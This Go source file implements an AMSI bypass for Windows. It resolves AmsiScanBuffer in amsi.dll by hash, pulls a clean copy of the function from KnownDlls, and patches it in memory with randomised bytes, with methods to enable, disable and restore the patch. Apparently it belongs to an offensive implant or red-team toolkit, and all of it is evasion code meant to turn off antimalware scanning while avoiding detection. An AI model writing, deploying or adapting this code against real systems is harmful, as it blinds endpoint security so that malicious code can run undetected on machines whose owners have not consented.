//go:build windows && amd64

package securityctl

import "fmt"

type AMSIControl struct {
	baseControl
	fp *funcPatch
}

func NewAMSIControl() *AMSIControl {
	return &AMSIControl{baseControl: newBaseControl("amsi")}
}

func (a *AMSIControl) Initialize() error {
	a.mu.Lock()
	defer a.mu.Unlock()
	if a.status == StatusInitialized || a.status == StatusEnabled || a.status == StatusDisabled {
		return a.initErr
	}

	fp, err := resolveFuncByHash("amsi.dll", "AmsiScanBuffer")
	if err != nil {
		a.initErr = err
		a.status = StatusUnsupported
		return err
	}

	knownDllFP, kerr := resolveFuncFromKnownDlls("amsi.dll", "AmsiScanBuffer")
	if kerr == nil && knownDllFP != nil {
		fp.orig = knownDllFP.orig
	}

	a.fp = fp
	a.status = StatusInitialized
	return nil
}

func (a *AMSIControl) Enable() error {
	a.mu.Lock()
	defer a.mu.Unlock()
	if a.status == StatusUnknown {
		return ErrNotInitialized
	}
	if a.status == StatusUnsupported {
		return ErrInitializeFailed
	}
	if a.fp == nil {
		a.status = StatusDisabled
		return fmt.Errorf("securityctl: amsi: not initialized")
	}
	a.fp.patch = randomAmsiPatchBytes()
	if err := applyPatch(a.fp); err != nil {
		a.status = StatusDisabled
		return err
	}
	a.status = StatusEnabled
	return nil
}

func (a *AMSIControl) Disable() error {
	a.mu.Lock()
	defer a.mu.Unlock()
	if a.status == StatusUnknown {
		return ErrNotInitialized
	}
	if a.status == StatusUnsupported {
		return ErrInitializeFailed
	}
	if a.fp == nil {
		a.status = StatusDisabled
		return nil
	}
	if err := restorePatch(a.fp); err != nil {
		return err
	}
	a.status = StatusDisabled
	return nil
}

func (a *AMSIControl) Restore() {
	a.mu.Lock()
	defer a.mu.Unlock()
	if a.fp == nil {
		return
	}
	_ = restorePatch(a.fp)
}
